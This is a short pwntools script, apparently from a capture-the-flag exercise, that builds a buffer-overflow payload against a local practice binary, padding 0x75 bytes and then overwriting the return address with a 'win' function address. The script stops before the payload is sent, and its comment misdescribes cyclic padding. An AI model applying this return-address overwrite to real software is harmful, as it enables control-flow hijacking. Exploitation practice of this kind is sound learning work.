from pwn import *
p=process("./withoutpie")


offset = 0x71
win_funky = 0x08049182
payload = cyclic(offset + 0x4) + p32(win_funky)

#cyclic means random junk converted to int.
